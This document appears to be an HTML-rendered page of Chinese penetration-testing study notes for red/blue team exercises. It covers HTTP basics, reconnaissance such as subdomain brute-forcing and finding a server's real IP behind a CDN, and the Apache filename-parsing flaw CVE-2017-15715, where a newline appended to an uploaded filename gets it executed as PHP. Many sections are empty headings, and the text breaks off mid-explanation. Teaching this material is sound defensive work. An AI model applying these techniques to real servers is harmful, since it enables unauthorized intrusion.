<template><div><h1 id="护网专题" tabindex="-1"><a class="header-anchor" href="#护网专题" aria-hidden="true">#</a> 护网专题</h1>
<h2 id="渗透流程" tabindex="-1"><a class="header-anchor" href="#渗透流程" aria-hidden="true">#</a> 渗透流程</h2>
<ul>
<li>信息收集</li>
<li>漏洞利用</li>
<li>权限提升</li>
<li>权限维持</li>
<li>内网代理</li>
<li>内网收集</li>
<li>内网漏洞</li>
<li>横向移动</li>
<li>跨域攻击</li>
<li>痕迹清理</li>
</ul>
<h2 id="什么是护网" tabindex="-1"><a class="header-anchor" href="#什么是护网" aria-hidden="true">#</a> 什么是护网</h2>
<h3 id="什么是-hw-行动" tabindex="-1"><a class="header-anchor" href="#什么是-hw-行动" aria-hidden="true">#</a> 什么是 HW 行动</h3>
<ul>
<li>安全设备
<ul>
<li>GEVPN 网关</li>
<li>机架式防火墙</li>
<li>网闸</li>
<li>VPN</li>
<li>IDS</li>
<li>IPS</li>
<li>蜜罐</li>
<li>VPN 网关</li>
<li>动态感知</li>
<li>安全邮件</li>
</ul>
</li>
</ul>
<h3 id="hw-人员职责划分" tabindex="-1"><a class="header-anchor" href="#hw-人员职责划分" aria-hidden="true">#</a> HW 人员职责划分</h3>
<ul>
<li>红队
<ul>
<li>打点队员</li>
<li>攻击队员</li>
<li>社工队员</li>
</ul>
</li>
<li>蓝队
<ul>
<li>监控人员（初）</li>
<li>研判人员（中）</li>
<li>溯源人员（高）</li>
</ul>
</li>
</ul>
<h3 id="hw-需要具备的技能" tabindex="-1"><a class="header-anchor" href="#hw-需要具备的技能" aria-hidden="true">#</a> HW 需要具备的技能</h3>
<ul>
<li>红队
<ul>
<li>外围打点、漏洞挖掘、漏洞分析、权限提升、权限维持、钓鱼远控、代码审计、木马免杀、内网渗透、横向移动、域渗透、跨域渗透</li>
</ul>
</li>
</ul>
<h3 id="如何定制自己的学习路线" tabindex="-1"><a class="header-anchor" href="#如何定制自己的学习路线" aria-hidden="true">#</a> 如何定制自己的学习路线</h3>
<h3 id="hw-能给自己带来什么" tabindex="-1"><a class="header-anchor" href="#hw-能给自己带来什么" aria-hidden="true">#</a> HW 能给自己带来什么</h3>
<h3 id="哪些公司需要-hw-人员" tabindex="-1"><a class="header-anchor" href="#哪些公司需要-hw-人员" aria-hidden="true">#</a> 哪些公司需要 HW 人员</h3>
<h2 id="http-介绍" tabindex="-1"><a class="header-anchor" href="#http-介绍" aria-hidden="true">#</a> HTTP 介绍</h2>
<h3 id="网络协议介绍" tabindex="-1"><a class="header-anchor" href="#网络协议介绍" aria-hidden="true">#</a> 网络协议介绍</h3>
<p><strong>通信协议</strong>是指双方实体完成通信或服务所必须遵循的规则和约定。</p>
<p>通信协议有三要素：</p>
<ul>
<li>语法：即如何通信，包括数据和控制信息的结构或者格式</li>
<li>语义：即通信内容，可以发送什么数据和控制信息，完成什么动作或者做什么响应</li>
<li>时序：信息交流的次序，先发什么、响应什么、再发什么...</li>
</ul>
<h4 id="tcp-ip-协议簇" tabindex="-1"><a class="header-anchor" href="#tcp-ip-协议簇" aria-hidden="true">#</a> TCP/IP 协议簇</h4>
<h4 id="tcp-ip-四层模型" tabindex="-1"><a class="header-anchor" href="#tcp-ip-四层模型" aria-hidden="true">#</a> TCP/IP 四层模型</h4>
<ul>
<li>
<p>数据链路层</p>
<p>实现网卡接口的网络驱动，在以太网、wifi 这些物理媒介上传输原始数据</p>
</li>
<li>
<p>网络层（网际互联层）</p>
<p>选择中间节点，以确定两台主机之间的通讯路径</p>
</li>
<li>
<p>传输层</p>
<p>负责节点的数据传输，实现格式化数据、发送数据、重连等功能</p>
</li>
<li>
<p>应用层</p>
<p>为用户提供各种需要的服务</p>
</li>
</ul>
<h4 id="osi-七层参考模型-open-system-inter-connection" tabindex="-1"><a class="header-anchor" href="#osi-七层参考模型-open-system-inter-connection" aria-hidden="true">#</a> OSI 七层参考模型（Open System Inter Connection）</h4>
<ul>
<li>应用层</li>
<li>表示层</li>
<li>会话层</li>
<li>传输层</li>
<li>网络层</li>
<li>数据链路层</li>
<li>物理层</li>
</ul>
<h3 id="http-协议介绍" tabindex="-1"><a class="header-anchor" href="#http-协议介绍" aria-hidden="true">#</a> HTTP 协议介绍</h3>
<ul>
<li>1971 年， TCP/IP 协议推出</li>
<li>1971 年， SMTP 协议推出</li>
<li>1971 年， FTP 协议推出</li>
<li>1972 年， Telnet 协议推出
<ul>
<li><code v-pre>telnet bbs.newsmth.net</code></li>
</ul>
</li>
<li>1991 年， HTTP 协议推出（Hypertext Transfer Protocol，超文本传输协议），同时推出了 HTML （Hypertext Markup Language，超文本标记语言）、 URL （Uniform Resource Locator，统一资源定位符）、浏览器和 Web 服务器的概念。这 5 个概念统称为 WWW（World Wide Web， 万维网）</li>
</ul>
<h4 id="uri" tabindex="-1"><a class="header-anchor" href="#uri" aria-hidden="true">#</a> URI</h4>
<ul>
<li>URL（Uniform Resource Identifier，统一资源标识符）
<ul>
<li>URN（Universal Resource Name， 统一资源名称）</li>
<li>URL（Uniform Resource Locator， 统一资源定位符）
<ul>
<li><code v-pre>http://user:password@www.test.com:80/root/index.html?id=1#chapter1</code></li>
<li><code v-pre>协议://认证信息@服务器地址:端口/路径/文件名?参数#占位符</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="" tabindex="-1"><a class="header-anchor" href="#" aria-hidden="true">#</a> </h3>
<h3 id="http-工作原理" tabindex="-1"><a class="header-anchor" href="#http-工作原理" aria-hidden="true">#</a> HTTP 工作原理</h3>
<h3 id="http-消息结构" tabindex="-1"><a class="header-anchor" href="#http-消息结构" aria-hidden="true">#</a> HTTP 消息结构</h3>
<h3 id="http-请求方法详解" tabindex="-1"><a class="header-anchor" href="#http-请求方法详解" aria-hidden="true">#</a> HTTP 请求方法详解</h3>
<table>
<thead>
<tr>
<th style="text-align:center">对比项</th>
<th>GET</th>
<th>POST</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">用途</td>
<td>请求数据（查询）</td>
<td>发送数据</td>
</tr>
<tr>
<td style="text-align:center">后端获取参数</td>
<td>从 URL 中直接获取</td>
<td>从Body中获取</td>
</tr>
<tr>
<td style="text-align:center">可见性</td>
<td>参数在 URL 中可见</td>
<td>参数在 URL 中不可见，存在与请求体中</td>
</tr>
<tr>
<td style="text-align:center">安全性</td>
<td>较差，有浏览历史、可保存为书签、可缓存</td>
<td>较好</td>
</tr>
<tr>
<td style="text-align:center">数据长度</td>
<td>浏览器对 URL 有长度限制，不同浏览器限制不同</td>
<td>几乎无长度限制</td>
</tr>
<tr>
<td style="text-align:center">数据类型</td>
<td>只允许 ASCII 字符</td>
<td>无限制</td>
</tr>
<tr>
<td style="text-align:center">连接过程</td>
<td>产生一个 TCP 数据包</td>
<td><strong>可能</strong>产生两个 TCP 数据包（大多数浏览器会先发送TCP数据包，有响应之后再发送要处理的数据包）</td>
</tr>
</tbody>
</table>
<h4 id="http-响应头信息" tabindex="-1"><a class="header-anchor" href="#http-响应头信息" aria-hidden="true">#</a> HTTP 响应头信息</h4>
<h4 id="请求头" tabindex="-1"><a class="header-anchor" href="#请求头" aria-hidden="true">#</a> 请求头</h4>
<div class="language-text line-numbers-mode" data-ext="text"><pre v-pre class="language-text"><code>POST / HTTP/1.1
Host: www.baidu.com
Accept：image/jpeg
Referer: http://localhost:8080
Accept-Language:zh-CN
UserAgent: Mozilla/4.0
Content-Type: application/x-www-form-urlencoded
Host: localhost:80
Content-Length: 240
Connection: keep-alive
Cache-Control: no-cache
Cookie= JSESSIONID=123456

name=123&amp;password=123456
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="响应报文" tabindex="-1"><a class="header-anchor" href="#响应报文" aria-hidden="true">#</a> 响应报文</h4>
<h3 id="http-状态码" tabindex="-1"><a class="header-anchor" href="#http-状态码" aria-hidden="true">#</a> HTTP 状态码</h3>
<table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1xx</td>
<td>信息。服务器接收到请求，需要请求者继续操作</td>
</tr>
<tr>
<td>2xx</td>
<td>成功。操作被成功接收并处理</td>
</tr>
<tr>
<td>3xx</td>
<td>重定向。需要进一步操作以完成请求</td>
</tr>
<tr>
<td>4xx</td>
<td>客户端错误。请求包含语法错误或者无法完成请求</td>
</tr>
<tr>
<td>5xx</td>
<td>服务端错误。服务端在处理请求的过程中发生了错误</td>
</tr>
</tbody>
</table>
<h3 id="http-特点总结" tabindex="-1"><a class="header-anchor" href="#http-特点总结" aria-hidden="true">#</a> HTTP 特点总结</h3>
<ol>
<li>请求应答模式（HTTP 1.1 （含）之前服务器不会主动向客户端发送消息，只有在接收到客户端请求之后才能应答客户端消息； HTTP 2.0 新增了 Push 功能，服务端可以主动向客户端推送消息）</li>
<li>灵活可扩展</li>
<li>可靠传输</li>
<li>无状态</li>
</ol>
<h3 id="http-服务器" tabindex="-1"><a class="header-anchor" href="#http-服务器" aria-hidden="true">#</a> HTTP 服务器</h3>
<ul>
<li>第三方工具
<ul>
<li>Apache、Nginx、Tomcat、Weblogic、IIS 等</li>
</ul>
</li>
<li>编程语言
<ul>
<li>Python。 <code v-pre>python -m http.server 8080</code></li>
<li>Java。</li>
</ul>
</li>
</ul>
<h3 id="http-客户端" tabindex="-1"><a class="header-anchor" href="#http-客户端" aria-hidden="true">#</a> HTTP 客户端</h3>
<ul>
<li>浏览器</li>
<li>APP</li>
<li>Python Requests</li>
<li>Java OKHttp、HTTPClient 等</li>
</ul>
<h3 id="http-调试工具" tabindex="-1"><a class="header-anchor" href="#http-调试工具" aria-hidden="true">#</a> HTTP 调试工具</h3>
<ul>
<li>开发者工具</li>
<li>HackBar</li>
<li>Postman</li>
<li>Burp Suite</li>
<li>WireShark</li>
<li>Fiddler</li>
<li>Charles</li>
<li>Curl 命令</li>
</ul>
<h2 id="burpsuite-的使用" tabindex="-1"><a class="header-anchor" href="#burpsuite-的使用" aria-hidden="true">#</a> BurpSuite 的使用</h2>
<h3 id="burp-下载和激活" tabindex="-1"><a class="header-anchor" href="#burp-下载和激活" aria-hidden="true">#</a> Burp 下载和激活</h3>
<h3 id="burp-suite-代理配置" tabindex="-1"><a class="header-anchor" href="#burp-suite-代理配置" aria-hidden="true">#</a> Burp Suite 代理配置</h3>
<h3 id="burp-suite-拦截-https" tabindex="-1"><a class="header-anchor" href="#burp-suite-拦截-https" aria-hidden="true">#</a> Burp Suite 拦截  HTTPS</h3>
<h3 id="burp-repeater-抓包与改包" tabindex="-1"><a class="header-anchor" href="#burp-repeater-抓包与改包" aria-hidden="true">#</a> Burp Repeater 抓包与改包</h3>
<h3 id="burp-intruder-爆破密码" tabindex="-1"><a class="header-anchor" href="#burp-intruder-爆破密码" aria-hidden="true">#</a> Burp Intruder 爆破密码</h3>
<h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h2>
<h3 id="域名信息收集" tabindex="-1"><a class="header-anchor" href="#域名信息收集" aria-hidden="true">#</a> 域名信息收集</h3>
<h4 id="域名是什么" tabindex="-1"><a class="header-anchor" href="#域名是什么" aria-hidden="true">#</a> 域名是什么</h4>
<h4 id="域名的分类" tabindex="-1"><a class="header-anchor" href="#域名的分类" aria-hidden="true">#</a> 域名的分类</h4>
<ul>
<li>国际域名： <code v-pre>.com（商业公司）</code>、 <code v-pre>.net（网络服务）</code>、 <code v-pre>.org（组织协会）</code>、 <code v-pre>.gov（政府部门）</code>、 <code v-pre>.edu（教育机构）</code>、 <code v-pre>.mil（军事领域）</code>、 <code v-pre>.int（国际组织）</code></li>
<li>国别域名： <code v-pre>.cn</code>、 <code v-pre>.uk</code>、 <code v-pre>.us</code> 等</li>
<li>新定级域名： <code v-pre>.biz</code>、 <code v-pre>.info</code>、 <code v-pre>.name</code>、 <code v-pre>.pro</code> 等</li>
</ul>
<h4 id="域名联系人信息" tabindex="-1"><a class="header-anchor" href="#域名联系人信息" aria-hidden="true">#</a> 域名联系人信息</h4>
<ul>
<li>域名注册商的 <code v-pre>whois</code> 信息</li>
<li>站长之家（<code v-pre>whois.chinaz.com</code>）的 <code v-pre>whois</code> 查询</li>
<li>站长之家（<code v-pre>whois.chinaz.com/reverse</code>） 的邮箱反查、注册人反查、电话反查等</li>
<li>WhoisSoft 网站（<code v-pre>whoissoft.com</code>） 查询</li>
<li>CNNIC 网站（<code v-pre>whois.cnnic.cn</code>）查询</li>
<li>Kali 的 <code v-pre>whois</code> 命令</li>
<li>工信部域名备案系统（<code v-pre>beian.miit.gov.cn</code>）查询</li>
<li>备案巴巴（<code v-pre>beian88.com</code>）查看</li>
<li>天眼查、企业查等</li>
</ul>
<h4 id="子域名信息" tabindex="-1"><a class="header-anchor" href="#子域名信息" aria-hidden="true">#</a> 子域名信息</h4>
<h5 id="子域名的概念" tabindex="-1"><a class="header-anchor" href="#子域名的概念" aria-hidden="true">#</a> 子域名的概念</h5>
<ul>
<li><code v-pre>.com</code> 是顶级域名</li>
<li><code v-pre>baidu.com</code> 是百度的域名</li>
<li><code v-pre>news.baidu.com</code> 是百度新闻的域名，也是 <code v-pre>baidu.com</code> 的子域名</li>
<li><code v-pre>maps.baidu.com</code> 是百度地图的域名，也是 <code v-pre>baidu.com</code> 的子域名</li>
</ul>
<h5 id="子域名爆破" tabindex="-1"><a class="header-anchor" href="#子域名爆破" aria-hidden="true">#</a> 子域名爆破</h5>
<ul>
<li>Layer 子域名挖掘机</li>
<li><code v-pre>phpinfo.me/domain</code> 在线子域名爆破</li>
<li><code v-pre>subDomainsBrute</code> 子域名爆破脚本（Python）</li>
</ul>
<h4 id="域名-dns-信息" tabindex="-1"><a class="header-anchor" href="#域名-dns-信息" aria-hidden="true">#</a> 域名 DNS 信息</h4>
<blockquote>
<p>DNS（Domain Name Server， 域名解析服务）</p>
</blockquote>
<h5 id="域名记录类型" tabindex="-1"><a class="header-anchor" href="#域名记录类型" aria-hidden="true">#</a> 域名记录类型</h5>
<ul>
<li><code v-pre>A</code>： 最常用的类型，将域名指向一个 <code v-pre>ipv4</code> 的地址</li>
<li><code v-pre>CNAME</code>： 别名类型，将域名指向另一个域名地址，与其保持相同的解析。</li>
<li><code v-pre>MX</code>： 用于邮件服务器，相关参数一般由邮件注册商提供</li>
<li><code v-pre>TXT</code>： 可填写附加文本信息，常用于域名验证</li>
<li><code v-pre>NS</code>： 域名服务器记录，可将指定域名交由其他 <code v-pre>DSN</code> 服务商解析管理</li>
<li><code v-pre>AAAA</code>： 将域名指向一个 <code v-pre>ipv6</code> 地址</li>
</ul>
<h3 id="ip-资源的信息收集" tabindex="-1"><a class="header-anchor" href="#ip-资源的信息收集" aria-hidden="true">#</a> IP 资源的信息收集</h3>
<h5 id="域名解析-ip" tabindex="-1"><a class="header-anchor" href="#域名解析-ip" aria-hidden="true">#</a> 域名解析 IP</h5>
<ul>
<li><code v-pre>dbcha.com</code></li>
<li><code v-pre>sitereport.netcraft.com</code></li>
<li><code v-pre>ping</code> 命令。<code v-pre>Packet Internet Groper， 因特网包探索器</code></li>
<li><code v-pre>nsloopup</code> 命令。 <code v-pre>net server lookup</code>， 网络服务查询</li>
</ul>
<h5 id="ip-归属信息查询" tabindex="-1"><a class="header-anchor" href="#ip-归属信息查询" aria-hidden="true">#</a> IP 归属信息查询</h5>
<ul>
<li>中国互联网信息中心（<code v-pre>ipwhois.cnnic.net.cn</code> ）查询</li>
</ul>
<h5 id="cdn-背后的真实-ip" tabindex="-1"><a class="header-anchor" href="#cdn-背后的真实-ip" aria-hidden="true">#</a> CDN 背后的真实 IP</h5>
<blockquote>
<p>CDN（Content Delivery Network， 内容分发网络）是建立并覆盖在承载网上，由不同区域的服务器组成的分布式网络。将源站资源缓存到全国各地的边缘服务器，供用户就近获取，降低源站压力。</p>
</blockquote>
<p>CDN 的实现原理：</p>
<ol>
<li>终端用户向指定资源发起请求时，首先向 LDNS（Local DNS）发起域名解析请求。</li>
<li>LDNS 检查缓存中是否有请求资源的 IP 地址记录。如果有，直接返回给终端； 如果没有，则向授权 DNS 查询。</li>
<li>授权 DNS 解析请求 URL 时，返回域名 CNAME 对应的 IP 地址。</li>
<li>域名解析请求发送 DNS 调度系统，并为请求分配最佳节点 IP 地址。（这里返回的是 CDN 服务商的 IP ，并非真实 IP ，绕过 CDN 找到真实 IP 成为了渗透工作中非常重要的一个环节）</li>
<li>LDNS 获取 DNS 返回的解析 IP 地址。</li>
<li>用户获取解析 IP 地址。</li>
<li>用户向获取到的 IP 地址发起该资源的访问请求。</li>
</ol>
<p>如何绕过 CDN 获取背后的真实 IP？</p>
<ul>
<li>超级 ping （部分地区可能没有被 CDN 覆盖）
<ul>
<li><code v-pre>ping.chinaz.com</code> 探测</li>
<li><code v-pre>nslookup</code></li>
</ul>
</li>
<li>历史 DNS （可能早期还没有使用 CDN）
<ul>
<li><code v-pre>http://dnshistory.org</code></li>
<li><code v-pre>http://toolbar.netcraft.com/site_report</code></li>
<li><code v-pre>https://tools.ipip.net/cdn.php</code></li>
<li><code v-pre>https://github.com/vincentcox/bypass-firewalls-by-DNS-history</code></li>
</ul>
</li>
<li>子域名查询（子域名可能与主域名在同一服务器，但子域名未使用 CDN）</li>
<li>国外主机解析（与超级 ping 原理类似，部分 CDN 厂商并未覆盖到国外）
<ul>
<li><code v-pre>https://asm.ca.com/zh_cn/ping.php</code></li>
<li><code v-pre>http://host-tracker.com</code></li>
<li><code v-pre>http://www.webpagetest.org</code></li>
<li><code v-pre>https://dnscheck.pingdom.com</code></li>
</ul>
</li>
<li>其他
<ul>
<li>网络空间引擎（fofa、 censys 等）</li>
<li>邮件</li>
<li>手机 APP 抓包</li>
<li>微信服务号抓包</li>
<li>...</li>
</ul>
</li>
</ul>
<h3 id="端口服务信息" tabindex="-1"><a class="header-anchor" href="#端口服务信息" aria-hidden="true">#</a> 端口服务信息</h3>
<h3 id="cms-指纹识别" tabindex="-1"><a class="header-anchor" href="#cms-指纹识别" aria-hidden="true">#</a> CMS 指纹识别</h3>
<h3 id="cdn-指纹识别" tabindex="-1"><a class="header-anchor" href="#cdn-指纹识别" aria-hidden="true">#</a> CDN 指纹识别</h3>
<h3 id="waf-指纹识别" tabindex="-1"><a class="header-anchor" href="#waf-指纹识别" aria-hidden="true">#</a> WAF 指纹识别</h3>
<h3 id="搜索引擎信息收集" tabindex="-1"><a class="header-anchor" href="#搜索引擎信息收集" aria-hidden="true">#</a> 搜索引擎信息收集</h3>
<h3 id="网络空间搜索引擎" tabindex="-1"><a class="header-anchor" href="#网络空间搜索引擎" aria-hidden="true">#</a> 网络空间搜索引擎</h3>
<h3 id="目录扫描" tabindex="-1"><a class="header-anchor" href="#目录扫描" aria-hidden="true">#</a> 目录扫描</h3>
<h3 id="git-信息收集" tabindex="-1"><a class="header-anchor" href="#git-信息收集" aria-hidden="true">#</a> Git 信息收集</h3>
<h3 id="网站信息收集" tabindex="-1"><a class="header-anchor" href="#网站信息收集" aria-hidden="true">#</a> 网站信息收集</h3>
<h3 id="人力资源信息收集" tabindex="-1"><a class="header-anchor" href="#人力资源信息收集" aria-hidden="true">#</a> 人力资源信息收集</h3>
<h3 id="社会工程学信息收集" tabindex="-1"><a class="header-anchor" href="#社会工程学信息收集" aria-hidden="true">#</a> 社会工程学信息收集</h3>
<h2 id="sql-注入" tabindex="-1"><a class="header-anchor" href="#sql-注入" aria-hidden="true">#</a> SQL 注入</h2>
<h3 id="mysql-基本操作" tabindex="-1"><a class="header-anchor" href="#mysql-基本操作" aria-hidden="true">#</a> MySQL 基本操作</h3>
<h3 id="sql-注入漏洞概述" tabindex="-1"><a class="header-anchor" href="#sql-注入漏洞概述" aria-hidden="true">#</a> SQL 注入漏洞概述</h3>
<h3 id="sql-注入实战详解" tabindex="-1"><a class="header-anchor" href="#sql-注入实战详解" aria-hidden="true">#</a> SQL 注入实战详解</h3>
<h3 id="sql-常见绕过技巧" tabindex="-1"><a class="header-anchor" href="#sql-常见绕过技巧" aria-hidden="true">#</a> SQL 常见绕过技巧</h3>
<h3 id="sql-map-工具的使用" tabindex="-1"><a class="header-anchor" href="#sql-map-工具的使用" aria-hidden="true">#</a> SQL MAP 工具的使用</h3>
<h3 id="sql-注入的防护" tabindex="-1"><a class="header-anchor" href="#sql-注入的防护" aria-hidden="true">#</a> SQL 注入的防护</h3>
<h2 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h2>
<h3 id="linux-常用命令讲解" tabindex="-1"><a class="header-anchor" href="#linux-常用命令讲解" aria-hidden="true">#</a> Linux 常用命令讲解</h3>
<h3 id="windows-常用命令讲解" tabindex="-1"><a class="header-anchor" href="#windows-常用命令讲解" aria-hidden="true">#</a> Windows 常用命令讲解</h3>
<h3 id="命令执行概述和介绍" tabindex="-1"><a class="header-anchor" href="#命令执行概述和介绍" aria-hidden="true">#</a> 命令执行概述和介绍</h3>
<h3 id="php-命令执行函数详解" tabindex="-1"><a class="header-anchor" href="#php-命令执行函数详解" aria-hidden="true">#</a> PHP 命令执行函数详解</h3>
<h3 id="命令执行漏洞的利用" tabindex="-1"><a class="header-anchor" href="#命令执行漏洞的利用" aria-hidden="true">#</a> 命令执行漏洞的利用</h3>
<h3 id="命令执行的防护方法" tabindex="-1"><a class="header-anchor" href="#命令执行的防护方法" aria-hidden="true">#</a> 命令执行的防护方法</h3>
<h2 id="xss、csrf、ssrf、xxe" tabindex="-1"><a class="header-anchor" href="#xss、csrf、ssrf、xxe" aria-hidden="true">#</a> XSS、CSRF、SSRF、XXE</h2>
<h3 id="xss-漏洞概述" tabindex="-1"><a class="header-anchor" href="#xss-漏洞概述" aria-hidden="true">#</a> XSS 漏洞概述</h3>
<h3 id="存储型和反射型-xss-详解" tabindex="-1"><a class="header-anchor" href="#存储型和反射型-xss-详解" aria-hidden="true">#</a> 存储型和反射型 XSS 详解</h3>
<h3 id="xss-漏洞的利用" tabindex="-1"><a class="header-anchor" href="#xss-漏洞的利用" aria-hidden="true">#</a> XSS 漏洞的利用</h3>
<h3 id="csrf-漏洞的利用" tabindex="-1"><a class="header-anchor" href="#csrf-漏洞的利用" aria-hidden="true">#</a> CSRF 漏洞的利用</h3>
<h3 id="get-型和-post-型的-xss" tabindex="-1"><a class="header-anchor" href="#get-型和-post-型的-xss" aria-hidden="true">#</a> GET 型和 POST 型的 XSS</h3>
<h3 id="xss-和-csrf-漏洞防护" tabindex="-1"><a class="header-anchor" href="#xss-和-csrf-漏洞防护" aria-hidden="true">#</a> XSS 和 CSRF 漏洞防护</h3>
<h3 id="xxe-漏洞概述" tabindex="-1"><a class="header-anchor" href="#xxe-漏洞概述" aria-hidden="true">#</a> XXE 漏洞概述</h3>
<h3 id="xxe-文件读取详解" tabindex="-1"><a class="header-anchor" href="#xxe-文件读取详解" aria-hidden="true">#</a> XXE 文件读取详解</h3>
<h3 id="xxe-内网探测详解" tabindex="-1"><a class="header-anchor" href="#xxe-内网探测详解" aria-hidden="true">#</a> XXE 内网探测详解</h3>
<h3 id="xxe-内网应用攻击详解" tabindex="-1"><a class="header-anchor" href="#xxe-内网应用攻击详解" aria-hidden="true">#</a> XXE 内网应用攻击详解</h3>
<h3 id="xxe-命令执行详解" tabindex="-1"><a class="header-anchor" href="#xxe-命令执行详解" aria-hidden="true">#</a> XXE 命令执行详解</h3>
<h3 id="xxe-防护" tabindex="-1"><a class="header-anchor" href="#xxe-防护" aria-hidden="true">#</a> XXE 防护</h3>
<h3 id="ssrf-漏洞概述" tabindex="-1"><a class="header-anchor" href="#ssrf-漏洞概述" aria-hidden="true">#</a> SSRF 漏洞概述</h3>
<h3 id="ssrf-端口探测详解" tabindex="-1"><a class="header-anchor" href="#ssrf-端口探测详解" aria-hidden="true">#</a> SSRF 端口探测详解</h3>
<h3 id="ssrf-读取文件详解" tabindex="-1"><a class="header-anchor" href="#ssrf-读取文件详解" aria-hidden="true">#</a> SSRF 读取文件详解</h3>
<h3 id="ssrf内网应用攻击详解" tabindex="-1"><a class="header-anchor" href="#ssrf内网应用攻击详解" aria-hidden="true">#</a> SSRF内网应用攻击详解</h3>
<h3 id="ssrf-防护" tabindex="-1"><a class="header-anchor" href="#ssrf-防护" aria-hidden="true">#</a> SSRF 防护</h3>
<h2 id="中间件漏洞" tabindex="-1"><a class="header-anchor" href="#中间件漏洞" aria-hidden="true">#</a> 中间件漏洞</h2>
<h3 id="apache-解析漏洞" tabindex="-1"><a class="header-anchor" href="#apache-解析漏洞" aria-hidden="true">#</a> Apache 解析漏洞</h3>
<blockquote>
<p>解析漏洞主要说的是一些特殊文件被 IIS、Apache、Nginx 在某些情况下解释成脚本文件格式的漏洞</p>
</blockquote>
<h5 id="漏洞简介" tabindex="-1"><a class="header-anchor" href="#漏洞简介" aria-hidden="true">#</a> 漏洞简介</h5>
<blockquote>
<p>Apache 文件解析漏洞与用户的配置有密切关系。严格来说，并不能称之为漏洞，这属于用户配置失误，apache 本身并不存在所谓的解析漏洞。</p>
</blockquote>
<h5 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h5>
<blockquote>
<p>Apache 默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在 <code v-pre>apache</code> 的 <code v-pre>config</code> 目录下的 <code v-pre>mime.types</code> 列表内）时，则继续向左识别。</p>
<p>解析漏洞的产生，是由于运维人员在配置服务器时，为了使 apache 服务器能够解析 php，而自己添加一个 handler</p>
<p><code v-pre>AddType application/x-httpd-php .php</code></p>
<p>它的作用也是为了让 apache 把 php 文件交给 php_module 解析，但是注意到 AddHandler 与 setHandler 不同， 它的后缀不是用正则去匹配的。所以，在文件名的任何位置匹配到 php 后缀，都会让 php_module 解析</p>
</blockquote>
<p>漏洞修复</p>
<blockquote>
<p>不要 AddHandler，改用 SetHandler，如下使用正则限制文件名，就不会有解析问题</p>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">".(php.|php3.|php4.|php5.)"</span><span class="token punctuation">></span></span>
Order Deny,Allow
Deny from all
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果需要保留文件名，也可以修改程序源码，替换上传文件名中的 &quot;.&quot; 为 &quot;_&quot;</p>
<div class="language-php line-numbers-mode" data-ext="php"><pre v-pre class="language-php"><code><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_repace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></blockquote>
<h5 id="cve-2017-15715" tabindex="-1"><a class="header-anchor" href="#cve-2017-15715" aria-hidden="true">#</a> CVE-2017-15715</h5>
<p>漏洞介绍</p>
<blockquote>
<p>Apache HTTPD 是一款 HTTP 服务器，它可以通过 <code v-pre>mod_php</code> 来运行 PHP 网页。 其 2.4.0 ~ 2.4.29 版本中存在一个解析漏洞，在解析 PHP 时， 例如 <code v-pre>123.php\x0a</code> 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。</p>
</blockquote>
<p>漏洞原理</p>
<ol>
<li>
<p>apache 这次解析漏洞的根本原因就是这个 <code v-pre>$</code>， 在正则中，<code v-pre>$</code> 用来匹配字符串结尾位置</p>
<blockquote>
<p><code v-pre>$</code> 符号： 匹配输入字符串的结尾位置，如果设置了 <code v-pre>RegExp</code> 对象的 <code v-pre>Multilne</code> 属性，则 <code v-pre>$</code> 也会匹配 <code v-pre>\n</code> 或 <code v-pre>\r</code>。</p>
<p>如果设置 <code v-pre>Multiline</code> 标示，就当做换行符处理，如果不设置就当做一行文本处理</p>
</blockquote>
</li>
<li>
<p>以一个靶场为例，找到 <code v-pre>apache</code> 核心配置文件 <code v-pre>apache2.conf</code>， 查看配置文件</p>
<blockquote>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code>IncludeOptional conf-enabled/*.conf
IncludeOptional sites-enabled/*.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></blockquote>
</li>
<li>
<p>跟进发现关于 <code v-pre>php</code> 的配置文件为 <code v-pre>docker-php.conf</code></p>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">\.php$</span><span class="token punctuation">></span></span>
	SetHandler application/x-httpd-php
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>可以看到正则 <code v-pre>\.php$</code> ，因为结尾的 <code v-pre>$</code>， 将匹配 <code v-pre>\n</code> 或 <code v-pre>\r</code>， 所以修改数据包在文件名后加上 <code v-pre>\n</code>， <code v-pre>\n</code> 的十六进制是 <code v-pre>0a</code></p>
</li>
<li>
